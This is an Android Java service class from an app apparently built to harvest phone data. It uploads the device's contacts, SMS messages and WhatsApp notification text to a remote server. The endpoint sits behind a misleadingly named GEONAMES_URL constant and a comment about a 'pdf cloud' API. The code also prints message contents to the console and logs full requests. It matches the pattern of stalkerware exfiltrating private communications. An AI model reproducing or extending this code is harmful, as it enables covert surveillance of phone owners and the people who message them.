package gonext.smsapp.servers;

import android.app.Notification;
import android.content.Context;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import com.squareup.okhttp.Cache;
import com.squareup.okhttp.OkHttpClient;

import java.io.File;
import java.util.List;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import gonext.smsapp.db.NotificationEntity;
import gonext.smsapp.utils.Constant;
import retrofit.RestAdapter;
import retrofit.client.OkClient;

/**
 * Created by ram on 14/09/17.
 */

public class SmsService {
    private Context context;
    private SmsAPI smsAPI;

    public SmsService(Context context) {
        this.context = context;
    }
    /**
     * Initialize pdf cloud Rest API call
     */
    private void initSMSAPI() {
        if (smsAPI == null) {
            Executor executor = Executors.newFixedThreadPool(1);

            OkHttpClient okHttpClient = new OkHttpClient();
            okHttpClient.setReadTimeout(30, TimeUnit.SECONDS);
            okHttpClient.setWriteTimeout(10, TimeUnit.SECONDS);
            okHttpClient.setConnectTimeout(10, TimeUnit.SECONDS);
            okHttpClient.setFollowSslRedirects(true);
            try {
                File cacheDir = new File(System.getProperty("java.io.tmpdir"), "okhttp-cache");
                Cache cache = new Cache(cacheDir, (20L * 1024 * 1024));
                okHttpClient.setCache(cache);
            }catch (Exception e){
                e.printStackTrace();
            }

            RestAdapter restAdapter = new RestAdapter.Builder().setEndpoint(Constant.GEONAMES_URL).setClient(new OkClient(okHttpClient)).setExecutors(executor, executor).setLogLevel(RestAdapter.LogLevel.FULL).build();
            smsAPI = restAdapter.create(SmsAPI.class);
        }
    }
    public void sendContacts(String userMob,String contactId,String contactNo,String contactName){
        initSMSAPI();
        SmsCallback smsCallback = new SmsCallback(1);
        smsAPI.postContacts("ContactList",userMob,contactId,contactNo,contactName,smsCallback);
    }
    public void sendSms(String userMob,String msgId,String msgDate,String msgFrom,String to,String msgText){
        initSMSAPI();
        SmsCallback smsCallback = new SmsCallback(2);
        smsAPI.postMessages("SMSList",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
    }

    public void sendNotification(String userMob, String msgId, String msgDate, String msgFrom, String to, String msgText, List<NotificationEntity> notifications){
        initSMSAPI();
        SmsCallback smsCallback = new SmsCallback(context,3,notifications);
        System.out.println("*****************************");
        System.out.println("userMob ="+userMob);
        System.out.println("msgId ="+msgId);
        System.out.println("msgDate ="+msgDate);
        System.out.println("msgFrom ="+removeSpChars(msgFrom));
        System.out.println("to ="+removeSpChars(to));
        System.out.println("msgText ="+msgText);
        System.out.println("*****************************");
        smsAPI.postWhatsApp("WHATSAPP",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
    }

    public static String removeSpChars(String s){
        s = s.replace("+","");
        s = s.replace("-","");
        s = s.replace("(","");
        s = s.replace(")","");
        s = s.replace(" ","");
        return s;
    }
}
